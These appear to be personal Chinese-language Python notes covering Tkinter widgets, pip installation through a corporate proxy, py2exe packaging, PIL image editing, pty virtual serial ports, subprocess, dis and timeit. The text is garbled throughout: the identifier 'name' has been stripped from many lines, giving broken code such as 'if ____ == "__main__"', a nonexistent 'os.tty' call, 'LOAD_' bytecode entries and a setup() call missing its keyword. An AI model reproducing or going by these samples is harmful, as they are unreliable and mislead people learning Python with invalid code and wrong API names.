9.Menubutton 菜单按钮。用来包含菜单的组件(有下拉式、层叠式等等)
10.Message 消息框。类似于标签,但可以显示多行文本
11.Radiobutton 单选按钮。一组按钮,其中只有一个可被"按下" (类似 HTML 中的 radio)
12.Scale 进度条。线性"滑块"组件,可设定起始值和结束值,会显示当前位置的精确值
13.Scrollbar 滚动条。对其支持的组件(文本域、画布、列表框、文本框)提供滚动功能
14.Text 文本域。 多行文字区域,可用来收集(或显示)用户输入的文字(类似 HTML 中的 textarea)
15.Toplevel 顶级。类似框架,但提供一个独立的窗口容器。

from Tkinter import *	 #引用Tk模块
root = Tk()	#初始化Tk()
root.title("hello world")
root.geometry('200x100')                 #是x 不是*
root.resizable(width=False, height=True) #宽不可变, 高可变,默认为True
root.mainloop()	#进入消息循环

title: 设置窗口标题
geometry: 设置窗口大小
resizable():设置窗口是否可以变化长 宽
#几个常用控件的用法

Label	标签
Frame	帧
Entry	条目
Text	文本
Button	按钮
Listbox	列表框
Scrollbar	滚动条

说明:每个控件最后要加上 pack().否则控件是无法显示的.
1.Label
#标签
bm = PhotoImage(file="e://11.PNG")
la = Label(root, text="show", bg="green", font=("Arial", 12), width=50, height=20,image = bm,compound = 'center')
la.pack(side=LEFT)  #这里的side可以赋值为 LEFT  RTGHT  TOP  BOTTOM

Label(root,
      text = 'center',
      compound = 'center',
      bitmap = 'error'
      ).pack()

left：  图像居左
right:  图像居右
top：  图像居上
bottom：图像居下
center：文字覆盖在图像上

Label(根对象, [属性列表])
#属性
text　   要现实的文本
bg　　  背景颜色
font　   字体(颜色, 大小)
width　 控件宽度
height　控件高度


#下拉菜单
#-*- encoding=UTF-8 -*-
__author__ = 'fyby'
from tkinter import *
root = Tk()

def hello():
    print('hello')

def about():
    print('我是开发者')

menubar = Menu(root)

#创建下拉菜单File,然后将其加入到顶级的菜单栏中
filemenu = Menu(menubar,tearoff=0)
filemenu.add_command(label="Open", command=hello)
filemenu.add_command(label="Save", command=hello)
filemenu.add_separator()
filemenu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="File", menu=filemenu)

#创建另一个下拉菜单Edit
editmenu = Menu(menubar, tearoff=0)
editmenu.add_command(label="Cut", command=hello)
editmenu.add_command(label="Copy", command=hello)
editmenu.add_command(label="Paste", command=hello)
menubar.add_cascade(label="Edit",menu=editmenu)
#创建下拉菜单Help
helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="About", command=about)
menubar.add_cascade(label="Help", menu=helpmenu)

#显示菜单
root.config(menu=menubar)

mainloop()


{

pyhon之Tkinter实例化学习
Tkinter模块("Tk 接口")是Python的标准Tk GUI工具包的接口,位Python的内置模块,直接import tkinter即可使用。
作为实践, 用Tkinter做了个ascii码转化查询表
1. 产品介绍
通过输入字符或数字查询对应的信息
通过选择列表中的信息查询对应的信息
#
2. 设计规划
3. 相关知识
首先看怎么产生第一个窗口
from Tkinter import *   #引用Tk模块
root = Tk()             #初始化Tk()
root.mainloop()         #进入消息循环
几个常用属性
title: 设置窗口标题
geometry: 设置窗口大小
resizable():设置窗口是否可以变化长 宽
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry('200x100')                 #是x 不是*
root.resizable(width=False, height=True) #宽不可变, 高可变,默认为True
root.mainloop()
#
介绍以下几个控件的用法
Label
Frame
Entry
Text
Button
Listbox
Scrollbar
说明每个控件最后要加上 pack() .否则控件是无法显示的.
3.1 Label
说明
　　标签
用法
　　Label(根对象, [属性列表])
属性
text　   要现实的文本
bg　　  背景颜色
font　   字体(颜色, 大小)
width　 控件宽度
height　控件高度
　　以下介绍的控件差不多都有这几个属性, 更详细的属性查看参考网页
举例
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry('300x200')
l = Label(root, text="show", bg="green", font=("Arial", 12), width=5, height=2)
l.pack(side=LEFT)  #这里的side可以赋值为LEFT  RTGHT TOP  BOTTOM
root.mainloop()
#
#
　　
3.2 Frame
说明
　　在屏幕上创建一块矩形区域,多作为容器来布局窗体
用法
　　Frame(根对象, [属性列表])
举例
     要在控件中出现这样的四个词语
                 校训
          厚德        敬业
          博学        乐群
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry('300x200')

Label(root, text='校训'.decode('gbk').encode('utf8'), font=('Arial', 20)).pack()

frm = Frame(root)
#left
frm_L = Frame(frm)
Label(frm_L, text='厚德'.decode('gbk').encode('utf8'), font=('Arial', 15)).pack(side=TOP)
Label(frm_L, text='博学'.decode('gbk').encode('utf8'), font=('Arial', 15)).pack(side=TOP)
frm_L.pack(side=LEFT)

#right
frm_R = Frame(frm)
Label(frm_R, text='敬业'.decode('gbk').encode('utf8'), font=('Arial', 15)).pack(side=TOP)
Label(frm_R, text='乐群'.decode('gbk').encode('utf8'), font=('Arial', 15)).pack(side=TOP)
frm_R.pack(side=RIGHT)

frm.pack()

root.mainloop()

3.3 Entry
说明
　　创建单行文本框
用法
　　创建:lb =Entry(根对象, [属性列表])
　　绑定变量 var=StringVar()    lb=Entry(根对象, textvariable = var)
　　获取文本框中的值   var.get()
　　设置文本框中的值   var.set(item1)
举例
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry()
var = StringVar()
e = Entry(root, textvariable = var)
var.set("hello")
e.pack()

root.mainloop()
#
#
　　
3.4 Text
说明
　　向该空间内输入文本
用法
　　t = Text(根对象)
　　插入:t.insert(mark, 内容)
　　删除:t.delete(mark1, mark2)
其中,mark可以是行号,或者特殊标识,例如
INSERT:光标的插入点CURRENT:鼠标的当前位置所对应的字符位置
END:这个Textbuffer的最后一个字符
SEL_FIRST:选中文本域的第一个字符,如果没有选中区域则会引发异常
SEL_LAST：选中文本域的最后一个字符,如果没有选中区域则会引发 异常
举例
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry('300x200')
t = Text(root)
t.insert(1.0, 'hello\n')
t.insert(END, 'hello000000\n')
t.insert(END, 'nono')
print(t.get(1.0,END))#获得所有输入的内容
t.pack(expand=YES, fill=BOTH)#允许进行扩展 ,填充X,Y轴
#t.pack() #固定的大小
root.mainloop()
#
#
　　
3.5 Button
说明
　　创建按钮
用法
　　Button(根对象, [属性列表])
举例
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry()
def printhello():
    t.insert('1.0', "hello\n")

t = Text()
t.pack()
Button(root, text="press", command = printhello).pack()
root.mainloop()
#Button中的窗口部件的选项
"""
#coding=gbk
activebackground, activeforeground:当按钮被激活时所使用的颜色
anchor:控制按钮上内容的位置。使用N, NE, E, SE, S, SW, W, NW, or CENTER这些值之一。默认值是CENTER。
background (bg), foreground (fg):按钮的颜色。默认值与特定平台相关。
bitmap:显示在窗口部件中的位图。如果image选项被指定了,则这个选项被忽略。下面的位图在所有平台上都有 效：error, gray75, gray50, gray25, gray12, hourglass, info, questhead, question, 和 warning.

borderwidth (bd):按钮边框的宽度。默认值与特定平台相关。但通常是1或2象素。
command:当按钮被按下时所调用的一个函数或方法。所回调的可以是一个函数、方法或别的可调用的Python对象。
cursor:当鼠标移动到按钮上时所显示的光标。
default:如果设置了,则按钮为默认按钮。
disabledforeground:当按钮无效时的颜色。
image:在部件中显示的图象。如果指定,则text和bitmap选项将被忽略。
justify:定义多行文本如何对齐。可取值有：LEFT, RIGHT, 或 CENTER。
padx, pady:指定文本或图象与按钮边框的间距。
state:按钮的状态：NORMAL, ACTIVE 或 DISABLED。默认值为NORMAL。
relief:边框的装饰。通常按钮按下时是凹陷的,否则凸起。另外的可能取值有GROOVE, RIDGE, 和 FLAT。
text:显示在按钮中的文本。文本可以是多行。如果bitmaps或image选项被使用,则text选项被忽略
textvariable:
underline:在文本标签中哪个字符加下划线。默认值为-1,意思是没有字符加下划线
width, height:按钮的尺寸。如果按钮显示文本,尺寸使用文本的单位。如果按钮显示图象,尺寸以象素为单位(或屏幕的单位)。如果尺寸没指定,它将根据按钮的内容来计算。
"""

#
#
　　
3.6 Listbox
说明
　　列表控件,可以含有一个或多个文本想,可单选也可多选
用法
　　创建:lb = ListBox(根对象, [属性列表])
　　绑定变量 var=StringVar()    lb=ListBox(根对象, listvariable = var)
　　得到列表中的所有值   var.get()
　　设置列表中的所有值   var.set((item1, item2,    ..))
　　添加:lb.insert(item)
　　删除:lb.delete(item,   )
　　绑定事件 lb.bind('<ButtonRelease-1>', 函数)
　　获得所选中的选项 lbl.get(lb.curselection())
属性
　　selectmode可以为BROWSE MULTIPL SINGLE
举例
#
# -*- coding: cp936 -*-
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry()
def print_item(event):
    print lb.get(lb.curselection())

var = StringVar()
lb = Listbox(root,  listvariable = var)
list_item = [1, 2, 3, 4]         #控件的内容为1 2 3 4
for item in list_item:
    lb.insert(END, item)
lb.delete(2, 4)                  #此时控件的内容为1 3
var.set(('a', 'ab', 'c', 'd'))   #重新设置了,这时控件的内容就编程var的内容了
print var.get()
lb.bind('<ButtonRelease-1>', print_item)
lb.pack()

root.mainloop()
#
#
　　
3.7 Scrollbar
说明
　　在屏幕上创建一块矩形区域,多作为容器来布局窗体
用法
　　Frame(根对象, [属性列表]), 最长用的用法是和别的控件一起使用.
举例
#
from Tkinter import *
root = Tk()
root.title("hello world")
root.geometry()
def print_item(event):
    print lb.get(lb.curselection())

var = StringVar()
lb = Listbox(root, height=5, selectmode=BROWSE, listvariable = var)
lb.bind('<ButtonRelease-1>', print_item)
list_item = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
for item in list_item:
    lb.insert(END, item)

scrl = Scrollbar(root)
scrl.pack(side=RIGHT, fill=Y)
lb.configure(yscrollcommand = scrl.set)
lb.pack(side=LEFT, fill=BOTH)
scrl['command'] = lb.yview
root.mainloop()
#
#
　　

#tkinter之文件对话框
from tkinter import *
from tkinter.filedialog import *

filetype = [('Python Files', '*.py *.pyw'),
     ('Text Files', '*.txt'),
     ('All Files', '*.*')]

def saveFileDialog():
    "保存对话框"
    file = asksaveasfile(
                                #默认扩展名,.号可带可不带
                                defaultextension = '.py',
                                #文件类型选项
                                filetypes = filetype,
                                #初始目录,默认当前目录
                                initialdir = 'G:\\Tkinter',
                                #初始文件名,默认为空
                                initialfile = 'Test',
                                #打开的位置,默认是根窗口
                                parent = root,
                                #窗口标题
                                title = "另存为")
    print(file)

def openFileDialog():
    "打开对话框,参数与保存对话框相同.略"
    file = askopenfile(filetypes = filetype)
    print(file)

root = Tk()
menubar = Menu(root)
filemenu = Menu(menubar, tearoff = 0)
filemenu.add_command(label = '打开', command = openFileDialog)
filemenu.add_command(label = '保存', command = saveFileDialog)
menubar.add_cascade(label = '文件', menu = filemenu)
root['menu'] = menubar
root.title('文件对话框')
root.mainloop()





#如何设置右键菜单?
context_menu = Menu(self.tv, tearoff=0)
context_menu.add_command(label="复制", command=copy_handler)
some_widget.bind('<3>', show_context_menu)

def show_context_menu(event):
    context_menu.post(event.x_root,event.y_root)

def copy_handler():
    pass
}
}

模块安装{
#http://www.cnblogs.com/xueranzp/p/5787270.html 常用库
#http://www.cnblogs.com/zdz8207/p/python_learn_note_8.html
C:\setuptools-25.1.1\setuptools-25.1.1
 解压要安装的模块,cmd切换到目录,运行setup.py install进行安装,就能安装上库  python setup.py install

当我们点开下载页时, 一般会看到以下几种格式的文件: msi, egg, whl
msi文件:Windows系统的安装包, 在Windows系统下可以直接双击打开, 并按提示进行安装
egg文件:setuptools使用的文件格式, 可以用setuptools进行安装
whl文件:wheel本质上是zip文件, 它使用.whl作为拓展名, 用于Python模块的安装, 它的出现是为了替代Eggs, 可以用pip的相关命令进行安装

easy_install,pip和一个egg什么什么的,都是python官方的第三方模块管理工具,
#现在python官方推荐的工具就是pip

#在cmd中输入"pip list"可一次查看所有安装的python库
C:\Users\>pip list
Pillow (4.0.0)
pip (8.1.2)
pymysql (0.7.6)
requests (2.10.0)
setuptools (2.1)
xlrd (0.9.2)
xlutils (2.0.0)
xlwt (1.1.2)

本人在公司使用windows域账户代理上网,用pip在线安装package 返回ProxyError,类似Tunnel connection failed: 407 authenticationrequired
#解决方案
# UNIX
export http_proxy=<user>:<password>@<proxy_ip_address>:<port>
export set https_proxy=<user>:<password>@<proxy_ip_address>:<port>
# Windows
c:\> set http_proxy=<user>:<password>@<proxy_ip_address>:<port>
c:\> set https_proxy=<user>:<password>@<proxy_ip_address>:<port>
上面需要注意的是windows域账户需要使用类似set https_proxy=<host>\\<user>:<password>@<proxy_ip_address>:<port>,host为域名

ip 就是  openproxy.qq.com  8080

set http_proxy=CHINA\:passwd@openproxy.qq.com:8080
set https_proxy=CHINA\:passwd@openproxy.qq.com:8080

set http_proxy=CHINA\:passwd@ip:8080
set https_proxy=CHINA\:passwd@ip:8080

export http_proxy=CHINA\:passwd@ip:8080
export https_proxy=CHINA\:passwd@ip:8080

公司所在网络需要使用代理服务器进行安装,命令如下：
python -m pip --proxy "http://user:password@proxyaddress:proxyPort" install -U pip
其中user是w3用户名,password是w3密码,@后面是代理服务器地址和端口号。

#cmd中的grep
netstat -aon|findstr "8080"

#win上设置代理后访问pip下载失败,报错"以一种访问权限不允许的方式做了一个访问嵌套字的尝试"

179上安装Python库
{
tar xf pip-9.0.1.tar.gz
python3 setup.py install

export http_proxy='CHINA\:passwd'@ip:8080
export https_proxy='CHINA\:passwd'@ip:8080

root@api:/home/lgj/python/pip-9.0.1# pip install requests
Requirement already satisfied: requests in /usr/local/lib/python3.4/dist-packages/requests-2.10.0-py3.4.egg
root@api:/home/lgj/python/pip-9.0.1# pip install Pillow
Collecting Pillow
  Downloading Pillow-4.0.0-cp34-cp34m-manylinux1_x86_64.whl (5.6MB)
    100% |████████████████████████████████| 5.6MB 321kB/s
Collecting olefile (from Pillow)
  Downloading olefile-0.44.zip (74kB)
    100% |████████████████████████████████| 81kB 9.4MB/s
Installing collected packages: olefile, Pillow
  Running setup.py install for olefile     done
Successfully installed Pillow-4.0.0 olefile-0.44
root@api:/home/lgj/python/pip-9.0.1#
root@api:/home/lgj/python/pip-9.0.1# python3
Python 3.4.3 (default, Oct 14 2015, 20:28:29)
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import PIL
>>> exit()
root@api:/home/lgj/python/pip-9.0.1#

#这样也可以的
root@api:/home/lgj/python/pip-9.0.1# python3 -m pip install
You must give at least one requirement to install (see "pip help install")
root@api:/home/lgj/python/pip-9.0.1# python3 -m pip install xlutils
Collecting xlutils
  Downloading xlutils-2.0.0-py2.py3-none-any.whl (55kB)
    100% |████████████████████████████████| 61kB 517kB/s
Collecting xlwt>=0.7.4 (from xlutils)
  Downloading xlwt-1.2.0-py2.py3-none-any.whl (99kB)
    100% |████████████████████████████████| 102kB 651kB/s
Requirement already satisfied: xlrd>=0.7.2 in /usr/local/lib/python3.4/dist-packages (from xlutils)
Installing collected packages: xlwt, xlutils
Successfully installed xlutils-2.0.0 xlwt-1.2.0
root@api:/home/lgj/python/pip-9.0.1#

#进阶版
root@api:/home/lgj/python/pip-9.0.1# pip install xlrd --proxy CHINA\\:'passwd'@ip:8080
Collecting xlrd
  Using cached xlrd-1.0.0-py3-none-any.whl
Installing collected packages: xlrd
Successfully installed xlrd-1.0.0
root@api:/home/lgj/python/pip-9.0.1#

#指定为哪个版本的 Python安装库
python2.7 -m pip install xlutils
python2.7 -m pip install setuptools
python2.7 -m pip install xlutils
}
#代理查看和去除
set |grep proxy
unset http_proxy https_proxy

#pip 常用命令：
install
download
uninstall
pip install xlrd --proxy CHINA\\:'passwd'@ip:8080  #使用代理

下载{
root@api:/home/lgj/python# pip download xlrd --proxy CHINA\\:'passwd'@ip:8080
Collecting xlrd
  Using cached xlrd-1.0.0-py3-none-any.whl
  Saved ./xlrd-1.0.0-py3-none-any.whl
Successfully downloaded xlrd
root@api:/home/lgj/python# ll
total 1328
drwxr-xr-x  3 root root     4096 Jan 16 17:00 ./
drwxr-xr-x 16 root root     4096 Jan 16 16:19 ../
drwxr-xr-x  7  501 staff    4096 Jan 16 16:20 pip-9.0.1/
-rw-r--r--  1 root root  1197370 Jan 16 16:20 pip-9.0.1.tar.gz
-rw-r--r--  1 root root   143594 Jan 16 17:00 xlrd-1.0.0-py3-none-any.whl
}
# pip install whatever.whl 安装whl格式的库

#python pyinstaller.py [opts] yourprogram.py
　　主要选项包括：
　　-F, –onefile 打包成一个exe文件。
　　-D, –onedir 创建一个目录,包含exe文件,但会依赖很多文件(默认选项)。
　　-c, –console, –nowindowed 使用控制台,无界面(默认)
　　-w, –windowed, –noconsole 使用窗口,无控制台
}

py2exe打包exe{
#https://pypi.python.org/pypi/py2exe/0.9.2.2#downloads  这个版本支持python3.4

提到了获取exe路径的办法,我们只需要在第一行代码执行前,cd到exe所在目录,就能保证相对路径没有问题了：
path=os.path.dir(sys.executable) #在打包成exe后正常使用
path=sys.path[0] #这样的方式会导致执行路径有问题

setup.py
{
from distutils.core import setup
import py2exe

#this allows to run it with a simple double click.

py2exe_options = {
        "compressed": 1,
        "optimize": 2,
        "ascii": 0,
        "bundle_files": 1,
        }

setup(
       = 'get',
      version = '1.0',
      windows = ['get.py',],   # 括号中更改为你要打包的代码文件名
      zipfile = None,
      options = {'py2exe': py2exe_options}
      )

}

#cmd
#python setup.py py2exe

}

PIL库的例子{
# -*-coding:utf-8 -*-
__author__ = 'Administrator'
from PIL import Image
from PIL import ImageFilter
from PIL import ImageEnhance

im = Image.open("C:/1.jpg")
print im.size, im.format, im.mode, im.info
# im.show() convert()可以用来转换色彩模式
# 设置拷贝区域, box变量是四元组(左,上,右,下)
box = (100, 100, 200, 200)
# 复制抠图 将im表示的图片对象拷贝到region中,大小(400*400),region其实也是image对象了。抠图
region = im.crop(box)
region = region.transpose(Image.ROTATE_180)  # 旋转方向
# 粘贴 母图.粘贴(子图,位置)
im.paste(region, box)
# 保存
im.save('C:/2.jpg')
# 分离三通道,红绿蓝
r, g, b = im.split()
# 保存查看之。直接调用show也可,但是windows不好用
r.save('C:/r.jpg')
# 调整图片大小
out = im.resize((128, 128))
# 图片逆时针旋转
out = im.rotate(45)
# 保存查看
out.save('C:/out.jpg')
# 各种翻转效果,镜面效果可以用transpose()预定义的旋转方式
reset = im.transpose(Image.FLIP_LEFT_RIGHT)  # 左右镜像
reset = im.transpose(Image.FLIP_TOP_BOTTOM)  # 上下镜像
reset = im.transpose(Image.ROTATE_270)

# 图像增强-滤镜filter
out = im.filter(ImageFilter.DETAIL)
out.save('C:/out3.jpg')
# 对每个点都做20%的增强
out = im.point(lambda i: i * 1.2)  # 注意这里用到一个匿名函数(那个可以把i的1.2倍返回的函数)
# 如上上边的那个例子,我们可以将一个RGB模式的图分离成三个通道的层
# 然后对一个通道进行加强或减弱操作,完成后我们又可以使用Merge将通道合并,从而改变图片的色调(冷暖色调的互换)等。
#### 点操作 #####
# img.point(function),这个function接受一个参数,且对图片中的每一个点执行这个函数,这个函数是一个匿名函数,在python之类的函数式编程语言中,可以使用
# lambda表达式来完成,如
# out = img.point(lambda i : i*1.2)#对每个点进行20%的加强
# 如果图片是"I"或者"F"模式,那么这个lambda必须使用这样的形式
# argument * scale + offset
# e.g
# out = img.point(lambda i: i*1.2 + 10)
#############
r = r.point(lambda i: i * 1.2)
g = g.point(lambda i: i * 0.7)
sexy = Image.merge('RGB', (r, g, b))
sexy.save("C:/sexy.png")
# 创建mask的语句：
mask = r.point(lambda i: i < 100 and 255)
# 该句可以用下句表示
# imout = im.point(lambda i: expression and 255)
# 如果expression为假则返回expression的值为0(因为and语句已经可以得出结果了),否则返回255。(mask参数用法：当为0时,保留当前值,255为使用paste进来的值,中间则用于transparency效果)
# 更高级的图片加强,可以使用ImageEnhance模块,其中包含了大量的预定义的图片加强方式。一旦有一个Image对象,
# 应用ImageEnhance对象就能快速地进行设置。 可以使用以下方法调整对比度、亮度、色平衡和锐利度。
enh = ImageEnhance.Contrast(im)
enh.enhance(1.3).show("30% more contrast")
# 创建一个新的图片
# Image.new(mode, size)
# Image.new(mode, size, color)
# 层叠图片
# 层叠两个图片,img2和img2,alpha是一个介于[0,1]的浮点数,如果为0,效果为img1,如果为1.0,效果为img2。当然img1和img2的尺寸和模式必须相同。这个函数可以做出很漂亮的效果来,而图形的算术加减后边会说到。
# Image.blend(img1, img2, alpha)
# composite可以使用另外一个图片作为蒙板(mask),所有的这三张图片必须具备相同的尺寸,mask图片的模式可以为"1","L","RGBA"(关于模式请参看前一篇)
# Image.composite(img1, img2, mask)
# 转换图形模式
# 下面看一个比较牛的方法convert,这个方法可以将图片在不同的模式间进行转换,在将灰度图转换成二值图时,所有的非零值被设置为255(白色)。灰度图的转换方式采用的是这个算法：
# L = R*299/1000 + G*587/1000 + B*114/1000

# 透明通道的使用
# putalpha(alpha)
# 这个方法是一个神奇的方法,你可以将一个图片(与原图尺寸相同)写入到原图片的透明通道中,而不影响原图片的正常显示,可以用于信息隐藏哦。当然,前提是原
# 始图片有透明通道。不过就算不是也没有多大关系,因为有PIL提供的convert功能,可以把一个图片先转换成RGBA模式,然后把要隐藏的信息文件转成"L"或者"1"模
# 式,最后使用这个putalpha将其叠加。而在图片的使用方,只需要简单的抽取其中的透明通道就可以看到隐藏信息了,哈哈。

def hideInfoInImage(im, info):
    if im.mode != "RGBA":
        im = im.convert("RGBA")
    if info.mode != "L" and info.mode != "1":
        info = info.convert("L")
    im.putalpha(info)
    return im


# 测试之
if ____ == "__main__":
    img = Image.open("green.png")
    band = Image.open("antelope_inhalf.jpg")

    img = hideInfoInImage(img, band)
    img.show()                       # 可以看到,原图片没有显式变化
    img.split()[3].show()            # 抽取出透明通道中的图片并显示


}

python虚拟串口和终端{
#! /usr/bin/env python
#coding=utf-8

import pty
import os
import select
#python虚拟串口
#pty是假串口的意思,但是支持硬件串口的所有操作
#import serial   serial是个串口的专门的库
def mkpty():
    # 打开伪终端
    master1, slave = pty.openpty()
    slave1 = os.tty(slave)
    master2, slave = pty.openpty()
    slave2 = os.tty(slave)
    print ('\nslave device s: ', slave1, slave2)
    return master1, master2

if ____ == "__main__":

    master1, master2 = mkpty()
    while True:
        rl, wl, el = select.select([master1,master2], [], [], 1)
        for master in rl:
            data = os.read(master, 128)
            print ("read %d data." % len(data))
            if master==master1:
                os.write(master2, data)
            else:
                os.write(master1, data)

#os.openpty()                    # 打开一个新的伪终端对。返回 pty 和 tty的文件描述符。
#os.write(fd, str)               # 写入字符串到文件描述符 fd中. 返回实际写入的字符串长度
#os.read(fd, n)                  # 从文件描述符 fd 中读取最多 n 个字节,返回包含读取字节的字符串,文件描述符 fd对应文件已达到结尾, 返回一个空字符串。
#os.tty(fd)                  # 返回一个字符串,它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联,则引发一个异常。
#os.dup(fd)                      # 复制文件描述符 fd
#os.dup2(fd, fd2)                # 将一个文件描述符 fd 复制到另一个 fd2

'''
>>> import os
>>> a,b=os.openpty()
>>> a
3
>>> b
4
>>> os.write(a,b"this is a test data")
19
>>> os.read(a,5)
b'this '
>>> os.tty(a)
'/dev/ptmx'
>>> os.tty(b)
'/dev/pts/2'
>>> os.dup(a)
6
>>> os.dup2(a,7)
'''

}

执行系统命令 subprocess.Popen{
subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)

参数args可以是字符串或者序列类型(如：list,元组),用于指定进程的可执行文件及其参数。如果是序列类型,第一个元素通常是可执行文件的路 径。我们也可以显式的使用executeable参数来指定可执行文件的路径。在windows操作系统上,Popen通过调用 CreateProcess()来创建子进程,CreateProcess接收一个字符串参数,如果args是序列类型,系统将会通过 list2cmdline()函数将序列类型转换为字符串。
参数bufsize：指定缓冲。我到现在还不清楚这个参数的具体含义,望各个大牛指点。
参数executable用于指定可执行程序。一般情况下我们通过args参数来设置所要运行的程序。如果将参数shell设为 True,executable将指定程序使用的shell。在windows平台下,默认的shell由COMSPEC环境变量来指定。
参数stdin, stdout, stderr分别表示程序的标准输入、输出、错误句柄。他们可以是PIPE,文件描述符或文件对象,也可以设置为None,表示从父进程继承。
参数preexec_fn只在Unix平台下有效,用于指定一个可执行对象(callable object),它将在子进程运行之前被调用。
参数Close_sfs：在windows平台下,如果close_fds被设置为True,则新创建的子进程将不会继承父进程的输入、输出、错误管 道。我们不能将close_fds设置为True同时重定向子进程的标准输入、输出与错误(stdin, stdout, stderr)。
如果参数shell设为true,程序将通过shell来执行。
参数cwd用于设置子进程的当前目录。
参数env是字典类型,用于指定子进程的环境变量。如果env = None,子进程的环境变量将从父进程中继承。
参数Universal_newlines:不同操作系统下,文本的换行符是不一样的。如：windows下用'/r/n'表示换,而Linux下用 '/n'。如果将此参数设置为True,Python统一把这些换行符当作'/n'来处理。
参数startupinfo与createionflags只在windows下用效,它们将被传递给底层的CreateProcess()函数,用 于设置子进程的一些属性,如：主窗口的外观,进程的优先级等等。
subprocess.PIPE
在创建Popen对象时,subprocess.PIPE可以初始化stdin, stdout或stderr参数。表示与子进程通信的标准流。
subprocess.STDOUT
创建Popen对象时,用于初始化stderr参数,表示将错误通过标准输出流输出。
Popen的方法：
Popen.poll()
用于检查子进程是否已经结束。设置并返回returncode属性。
Popen.wait()
等待子进程结束。设置并返回returncode属性。
Popen.communicate(input=None)
与子进程进行交互。向stdin发送数据,或从stdout和stderr中读取数据。可选参数input指定发送到子进程的参数。 Communicate()返回一个元组：(stdoutdata, stderrdata)。注意：如果希望通过进程的stdin向其发送数据,在创建Popen对象的时候,参数stdin必须被设置为PIPE。同样,如 果希望从stdout和stderr获取数据,必须将stdout和stderr设置为PIPE。
Popen.send_signal(signal)
向子进程发送信号。
Popen.terminate()
停止(stop)子进程。在windows平台下,该方法将调用Windows API TerminateProcess()来结束子进程。
Popen.kill()
杀死子进程。
Popen.stdin
如果在创建Popen对象是,参数stdin被设置为PIPE,Popen.stdin将返回一个文件对象用于策子进程发送指令。否则返回None。
Popen.stdout
如果在创建Popen对象是,参数stdout被设置为PIPE,Popen.stdout将返回一个文件对象用于策子进程发送指令。否则返回 None。
Popen.stderr
如果在创建Popen对象是,参数stdout被设置为PIPE,Popen.stdout将返回一个文件对象用于策子进程发送指令。否则返回 None。
Popen.pid
获取子进程的进程ID。
Popen.returncode
获取进程的返回值。如果进程还没有结束,返回None。
}

dis与字节码阅读{
dis模块主要是用来分析字节码的一个内置模块,经常会用到的方法是dis.dis([bytesource]),参数为一个代码块,可以得到这个代码块对应的字节码指令序列。
dis 也可以作为模块使用.  可以解析模块,类,方法,函数,生成器,代码对象,源代码字符串或原始字节码的字节序列。
#查看PYTHON的指令码
import opcode
for op in range(len(opcode.op)):
    print('0x%.2X(%.3d): %s' % (op, op, opcode.op[op]))
#http://www.cnblogs.com/fortwo/archive/2013/05/13/3076780.html  #api文档中也有,方便查看！
python3的指令集和说明 ------牛的一逼
dis模块获得了两个新的函数来检查代码,code_info()和show_code()。 两者都提供了提供的功能,方法,源代码字符串或代码对象的详细代码对象信息。 前者返回一个字符串,后者打印出来：
打印所提供函数,方法,源代码字符串或代码对象到文件的详细代码对象信息(如果未指定文件,则打印sys.stdout)
>>> import dis, random
>>> dis.show_code(random.choice)
:              choice
File:          /Library/Frameworks/Python.framework/Versions/3.2/lib/python3.2/random.py
Argument count:    2
Kw-only arguments: 0
Number of locals:  3
Stack size:        11
Flags:             OPTIMIZED, NEWLOCALS, NOFREE
Constants:
   0: 'Choose a random element from a non-empty sequence.'
   1: 'Cannot choose from an empty sequence'
s:
   0: _randbelow
   1: len
   2: ValueError
   3: IndexError
Variable s:
   0: self
   1: seq
   2: i


>>> dis.dis('3*x+1 if x%2==1 else x//2')
  1           0 LOAD_                0 (x)
              2 LOAD_CONST               0 (2)
              4 BINARY_MODULO
              6 LOAD_CONST               1 (1)
              8 COMPARE_OP               2 (==)
             10 POP_JUMP_IF_FALSE       24
             12 LOAD_CONST               2 (3)
             14 LOAD_                0 (x)
             16 BINARY_MULTIPLY
             18 LOAD_CONST               1 (1)
             20 BINARY_ADD
             22 RETURN_VALUE
        >>   24 LOAD_                0 (x)
             26 LOAD_CONST               0 (2)
             28 BINARY_FLOOR_DIVIDE
             30 RETURN_VALUE
>>>
}

timeit代码性能测试{
#例子1
>>> print (timeit.timeit(stmt="[i for i in range(1000)]", number=100000))
7.60359542902799
>>> foooo = """
sum = []
for i in range(1000):
    sum.append(i)
"""
>>> print (timeit.timeit(stmt=foooo, number=100000))
21.626627965286076

测试一段代码的运行时间,在python里面有个很简单的方法,就是使用timeit模块,使用起来超级方便,下面简单介绍一个timeit模块中的函数
主要就是这两个函数：
1,  timeit(stmt='pass', setup='pass', timer=<defaulttimer>, number=1000000)
       返回：
            返回执行stmt这段代码number遍所用的时间,单位为秒,float型
       参数：
            stmt ：要执行的那段代码
            setup ：执行代码的准备工作,不计入时间,一般是import之类的
            timer ：这个在win32下是time.clock(),linux下是time.time(),默认的,不用管
            number ：要执行stmt多少遍
2,  repeat(stmt='pass', setup='pass', timer=<defaulttimer>, repeat=3, number=1000000)
       这个函数比timeit函数多了一个repeat参数而已,表示重复执行timeit这个过程多少遍,返回一个列表,表示执行每遍的时间

#例子2
import timeit
print timeit.timeit("sum(x)","x=(i for i in range(100))")
0.114394682716

def test():
    L = [i for i in range(100)]
#在setup中导入自定义函数
if ____ == '__main__':
    import timeit
    print(timeit.timeit("test()", setup="from __main__ import test",number=10000))

0.0800761957937

#例子3
import timeit
t = timeit.Timer('char in text', setup='text = "I love FishC.com!"; char = "o"')
t.timeit()
0.054789127320191255
t.repeat()
[0.05562128719998327, 0.046032358580077926, 0.044957160393096274]

